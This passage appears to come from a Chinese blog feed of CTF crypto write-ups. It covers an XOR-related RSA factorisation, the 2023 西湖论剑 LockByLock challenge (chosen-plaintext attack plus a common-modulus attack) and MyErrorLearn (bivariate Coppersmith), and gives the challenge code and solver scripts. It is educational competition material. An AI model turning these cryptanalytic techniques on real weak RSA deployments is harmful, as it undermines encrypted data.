(<span class="number">1</span> &lt;&lt; <span class="number">512</span>) - <span class="number">1</span> ^ bytes_to_long(<span class="string">b&#x27;Xennymeiyouxiaojiji&#x27;</span>))</span><br><span class="line">n = p * q</span><br><span class="line">c = powmod(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br></pre></td></tr></table></figure><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>与第五空间的一道题类似，考察对异或的理解。</p><p>先不看<code>bytes_to_long(b&#39;Xennymeiyouxiaojiji&#39;)</code>，(1&lt;&lt;512)-1即512个1，与p异或，会得到p的相反数，也就是说p与p ^ ((1&lt;&lt;512)-1)互为相反数，</p><p>若p ^ ((1&lt;&lt;512)-1)^bytes_to_long(b’Xennymeiyouxiaojiji’)，<code>b&#39;Xennymeiyouxiaojiji&#39;占151位，</code>异或后只会影响1——151位，而不会152到512位不会影响.</p><p>所以在152到512位之间，可近似理解p+q为一个定值，则易得n=pq当p=q时n最大，p和q相差越大n越小，从二进制的角度看，p和q在这个段内每一位上有且只有一个（要么是p要么是q在这个位上）为1，另一个是0,在p,q之和固定时，p,q相差越大，所得的乘积n就会越小，因此我们先把所有的1都给p，0全给q。</p><p>这句话可能不好理解，我们看一个例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="string">&#x27;101011&#x27;</span></span><br><span class="line">q = <span class="string">&#x27;010100&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(p, <span class="number">2</span>)*<span class="built_in">int</span>(q, <span class="number">2</span>))  <span class="comment"># 860</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p和q赋值如下</span></span><br><span class="line">p = <span class="string">&#x27;111111&#x27;</span></span><br><span class="line">q = <span class="string">&#x27;000001&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一位异或后</span></span><br><span class="line">p = <span class="string">&#x27;011111&#x27;</span></span><br><span class="line">q = <span class="string">&#x27;100001&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(p, <span class="number">2</span>)*<span class="built_in">int</span>(q, <span class="number">2</span>))  <span class="comment"># 1023</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">大于原先值，那么该位不用改，即</span></span><br><span class="line"><span class="string">p = &#x27;111111&#x27;</span></span><br><span class="line"><span class="string">q = &#x27;000001&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二位异或后</span></span><br><span class="line">p = <span class="string">&#x27;101111&#x27;</span></span><br><span class="line">q = <span class="string">&#x27;010001&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(p, <span class="number">2</span>)*<span class="built_in">int</span>(q, <span class="number">2</span>))  <span class="comment"># 799</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">小于原先值，那么该位要改，进行异或，即</span></span><br><span class="line"><span class="string">p = &#x27;101111&#x27;</span></span><br><span class="line"><span class="string">q = &#x27;010001&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过这种方法我们可以求得152到512位，剩下的用coppersmith定理求解即可</p><p>完整代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">n = <span class="number">43872447918272881483894860135420294840077675197278872914621521667921308247676523804114495313813443674225449796507001261661080965680442448766085625516764546771216157284166452707510738520562997618181132986268886911397911045477950894707653737039068742331967366966594178762371670815205574890851565211520509280877</span></span><br><span class="line">c = <span class="number">36695106707787345374605742641251317275794282394274240124380886348224128300052693750833314472340249969636753061533381556497302217843159196946484540647047913749161185408236991871583979983106076236587166394599128465096644797010738632973314599069141428672461022732768750756705098943185371902749159203449841972402</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = (<span class="number">1</span>&lt;&lt;<span class="number">512</span>)-<span class="number">1</span></span><br><span class="line">q = <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bin</span>(p))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bin</span>(q))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">511</span>, <span class="number">160</span>, -<span class="number">1</span>)):<span class="comment">#511，56分别表示开始和结束的，-1表示移动的格数</span></span><br><span class="line">    cur = <span class="number">1</span>&lt;&lt;i</span><br><span class="line">    <span class="keyword">if</span> (p^^cur) * (q^^cur) &lt; n:</span><br><span class="line">        p ^^= cur</span><br><span class="line">        q ^^= cur</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line">p=(p&gt;&gt;<span class="number">160</span>)&lt;&lt;<span class="number">160</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + p</span><br><span class="line"></span><br><span class="line">roots = f.small_roots(X=<span class="number">2</span>^<span class="number">160</span>,beta=<span class="number">0.4</span>)</span><br><span class="line"><span class="comment"># 经过以上一些函数处理后，n和p已经被转化为10进制</span></span><br><span class="line"><span class="keyword">if</span> roots: </span><br><span class="line">    p= p + <span class="built_in">int</span>(roots[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;p =&quot;</span>,p)</span><br><span class="line">    <span class="keyword">assert</span> n % p == <span class="number">0</span></span><br><span class="line">    q = n//<span class="built_in">int</span>(p)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;q =&quot;</span>,q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> p*q==n</span><br><span class="line">d = gmpy2.invert(<span class="number">0x10001</span>, (p-<span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">m=power_mod(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> crypto </category>
          
          <category> match </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> match </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 西湖论剑 crypto篇部分wp</title>
      <link href="/2023/02/04/2023%20%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%20crypto%E7%AF%87wp/"/>
      <url>/2023/02/04/2023%20%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%20crypto%E7%AF%87wp/</url>
      
        <content type="html"><![CDATA[<h1 id="LockByLock"><a href="#LockByLock" class="headerlink" title="LockByLock"></a>LockByLock</h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><blockquote><p>选择明文攻击  共模攻击</p></blockquote><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Lock</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, p, q</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            self.p = p</span><br><span class="line">            self.q = q</span><br><span class="line">            self.n = self.p * self.q</span><br><span class="line">            self.e = random.randint(<span class="number">10</span>**<span class="number">14</span>, <span class="number">10</span>**<span class="number">15</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> gcd(self.e, (self.p-<span class="number">1</span>)*(self.q-<span class="number">1</span>)) == <span class="number">1</span>:</span><br><span class="line">                self.d = invert(self.e, (self.p-<span class="number">1</span>)*(self.q-<span class="number">1</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lock</span>(<span class="params">self, message: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">assert</span> <span class="number">1</span> &lt; message &lt; self.n</span><br><span class="line">        <span class="keyword">return</span> powmod(message, self.e, self.n)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">unlock</span>(<span class="params">self, cipher: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">assert</span> <span class="number">1</span> &lt; cipher &lt; self.n</span><br><span class="line">        <span class="keyword">return</span> powmod(cipher, self.d, self.n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secureProcedure</span>(<span class="params">A, B</span>):</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    flag = bytes_to_long(flag)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Alice: lock lock lock lock unlock&#x27;</span>)</span><br><span class="line">    msg1 = A.lock(flag)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Alice: locked msg1 = <span class="subst">&#123;msg1&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Alice: lock lock lock lock&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Bob: lock unlock lock lock&#x27;</span>)</span><br><span class="line">    msg2 = B.lock(msg1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Bob: locked msg2 = <span class="subst">&#123;msg2&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Bob: lock lock lock lock&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Alice: unlock unlock unlock...&#x27;</span>)</span><br><span class="line">    msg3 = A.unlock(msg2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Alice: unlocked msg3 = <span class="subst">&#123;msg3&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Alice: lock lock lock lock&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Bob: unlock unlock unlock...&#x27;</span>)</span><br><span class="line">    msg = B.unlock(msg3)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">assert</span> msg == flag</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Bob: lock lock unlock&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Bob: lock by lock, lock lock right, unlock unlock unlock...&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Alice: right right, lock lock unlock&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Bob: lock lock lock, flag lock lock lock.&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Alice: lock unlock lock lock, unlock lock lock&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Bob: lock lock!&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proxyProcedure</span>(<span class="params">A, B</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Agent: lock lock, lock lock lock, unlock lock lock right&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Alice: lock!&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Bob: lock lock, unlock lock!&#x27;</span>)</span><br><span class="line">    omsg = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Alice: lock lock lock lock unlock&#x27;</span>)</span><br><span class="line">    msg1 = A.lock(omsg)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Alice: locked msg1 = <span class="subst">&#123;msg1&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Alice: lock lock lock lock&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Bob: lock unlock lock lock&#x27;</span>)</span><br><span class="line">    msg2 = B.lock(msg1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Bob: locked msg2 = <span class="subst">&#123;msg2&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Bob: lock lock lock lock&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Alice: unlock unlock unlock...&#x27;</span>)</span><br><span class="line">    msg3 = A.unlock(msg2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Alice: unlocked msg3 = <span class="subst">&#123;msg3&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Alice: lock lock lock lock&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Bob: unlock unlock unlock...&#x27;</span>)</span><br><span class="line">    msg = B.unlock(msg3)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">assert</span> msg == omsg</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Bob: lock, lock, locked lock lock lock unlock&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Bob: lock by lock, lock lock right, lock unlock unlock unlock...&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Alice: right right, locked lock lock lock unlock&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Bob: lock lock!&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q = getPrime(<span class="number">1024</span>)</span><br><span class="line">    AliceLock = Lock(p, q)</span><br><span class="line">    BobLock = Lock(p, q)</span><br><span class="line">    </span><br><span class="line">    secureProcedure(AliceLock, BobLock)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        proxyProcedure(AliceLock, BobLock)</span><br><span class="line">        proxyProcedure(AliceLock, BobLock)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Lock: lock lock lock, unlock lock lock lock, lock lock unlock lock unlock lock, lock.&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;lock unlock, lock locked, unlocked lock&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>分析代码可知，使用相同的p，q，n=p*q，用了两个不同的e加密，给出了msg1，msg2，msg3</p><blockquote>$msg_1{\equiv}m^{e_1} {\,}mod {\,}n$</blockquote><blockquote>$msg_2{\equiv}m^{{e_1}*{e_2}}{\,}mod {\,}n$</blockquote><blockquote>$msg_1{\equiv}m^{e_2} {\,}mod {\,}n$</blockquote><p><strong>考察选择明文攻击:</strong></p><p>我们可以加密 2，4。</p><p>举例：</p>$c2≡2^e{\,}mod{\,}n$$c4≡4^e{\,}mod{\,}n$<p>那么</p>$c^2_2≡c_4{\,}mod{\,}n$<p>故而</p>$c^2_2−c_4=kn$<p>在 e 比较小时(e&lt;$2^{64}$)时，我们可以利用 <em>Pollard’s kangaroo algorithm</em> 算法获取 e</p><p>之后使用共模攻击即可</p><p>虽然想的很好，但在比赛过程中我没做出来，不知道为什么，比赛完后看别人的wp，没什么差别，最后和别人讨论发现好像是因为我得到的数据有些巧合，这一步：</p><p><img src="https://s1.vika.cn/space/2023/02/07/feeffbd02dfb451aabe9234a252c28c0" alt="image-20230207183312803"></p><p>可以这样理解，举个例子：</p><blockquote><p>temp1=k1*n</p><p>temp2=k2*n</p><p>k1=2*5</p><p>k2=2</p><p>所以我得到的是2*n</p></blockquote><p>所以要加上这一步：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">if</span> n%i==<span class="number">0</span>:</span><br><span class="line">        n=n//i</span><br></pre></td></tr></table></figure><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">msg1 = </span><br><span class="line">msg2 = </span><br><span class="line">msg3 = </span><br><span class="line">c11 = </span><br><span class="line">c12 = </span><br><span class="line">c13 = </span><br><span class="line">c21 = </span><br><span class="line">c22 = </span><br><span class="line">c23 = </span><br><span class="line">tmp1 = c11 ** <span class="number">2</span> - c21</span><br><span class="line">tmp2 = c13 ** <span class="number">2</span> - c23</span><br><span class="line">n = gmpy2.gcd(tmp1,tmp2)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">if</span> n%i==<span class="number">0</span>:</span><br><span class="line">        n=n//i</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># e1 = discrete_log_lambda(Zmod(n)(c11),Zmod(n)(2),(10**14,10**15))</span></span><br><span class="line"><span class="comment"># print(e1)</span></span><br><span class="line"><span class="comment"># e2 = discrete_log_lambda(Zmod(n)(c13),Zmod(n)(2),(10**14,10**15))</span></span><br><span class="line"><span class="comment"># print(e2)</span></span><br><span class="line">e1=</span><br><span class="line">e2=</span><br><span class="line">c1 = msg1</span><br><span class="line">c2 = msg3</span><br><span class="line">temp = gmpy2.gcdext(e1,e2)</span><br><span class="line">r,s = temp[<span class="number">1</span>],temp[<span class="number">2</span>]</span><br><span class="line">m = (<span class="built_in">pow</span>(c1,r,n)*<span class="built_in">pow</span>(c2,s,n))%n</span><br><span class="line">_gcd = gmpy2.gcd(e1,e2)</span><br><span class="line">m = gmpy2.iroot(<span class="built_in">int</span>(m),<span class="built_in">int</span>(_gcd))[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h1 id="MyErrorLearn"><a href="#MyErrorLearn" class="headerlink" title="MyErrorLearn"></a>MyErrorLearn</h1><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><blockquote><p>二元coppersmith</p></blockquote><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random, os</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">flag = os.getenv(<span class="string">&#x27;DASFLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = random.getrandbits(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt; mod =&#x27;</span>, p)</span><br><span class="line">secret = random.randint(<span class="number">1</span>, p-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">XennyOracle</span>():</span><br><span class="line">    r = getPrime(<span class="number">512</span>)</span><br><span class="line">    d = invert(secret+r, p) - getPrime(<span class="number">246</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&gt; r =&#x27;</span>, r)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&gt; d =&#x27;</span>, d)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>():</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        op = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">        <span class="keyword">if</span> op == <span class="number">1</span>:</span><br><span class="line">            XennyOracle()</span><br><span class="line">        <span class="keyword">elif</span> op == <span class="number">2</span>:</span><br><span class="line">            ss = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ss == secret:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;flag: &#x27;</span>, flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    task()</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Error. try again.&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>一共有三次机会，两次得到数据，d，r，一次用来验证secret得到flag</p><p>前两次可以得到数据d，r</p><p>设getprime(256)生成的两个256bit的数据为$t_1,t_2$</p><p>得到等式：</p>$(s+r_1)*(d_1+t_1){\equiv}1{\,}mod{\,}p$$(s+r_2)*(d_2+t_2){\equiv}1{\,}mod{\,}p$<p>消去s，得到</p>$(r_1-r_2)*(d_1+t_1)*(d_2+t_2)-(d_2-d_1)-(t_2-t_1){\equiv}0{\,}mod{\,}p$<p>之后二元多项式求小值跟得到$(t_1,t_2)$</p><p>代入式子得到s</p><p>注意：</p><blockquote><p>p未必是素数，取模的过程可能不存在逆元，所以多试几组</p></blockquote><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">p = </span><br><span class="line">r1 = </span><br><span class="line">d1 = </span><br><span class="line">r2 = </span><br><span class="line">d2 = </span><br><span class="line"><span class="comment">#coppersmith</span></span><br><span class="line"><span class="keyword">def</span> <span 